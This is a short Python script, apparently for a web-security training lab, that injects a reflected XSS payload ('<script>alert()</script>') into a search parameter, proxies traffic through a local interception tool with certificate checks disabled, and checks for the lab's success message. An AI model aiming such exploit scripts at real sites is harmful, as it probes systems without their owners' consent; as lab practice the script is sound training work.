import time
import argparse
import logging
import urllib3

import requests


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

HEADERS = {
    "X-Pwnfox-Color":"yellow",
}

PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--no-proxy",help="to use no proxy",default=False,action="store_true")
    parser.add_argument("url",help="xss vulnerable url")
    return parser.parse_args()



def exploit(url,no_proxy):

    payload = "<script>alert()</script>"


    session = requests.Session()

    if not no_proxy:
        session.proxies.update(PROXIES)

    session.headers.update(HEADERS)

    log.info("sending payload...")
    r = session.get(url+f"?search={payload}",verify=False)



    time.sleep(1)

    r = session.get(url,verify=False)


    if "Congratulations, you solved the lab!" not in r.text:
        time.sleep(1)
        r = session.get(url,verify=False)
        if "Congratulations, you solved the lab!" not in r.text:
            log.info("exploit failed!")
        else:
            print("aa")
            log.info("reflected xss exploited!")
    else:
        log.info("reflected xss exploited!")






def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)
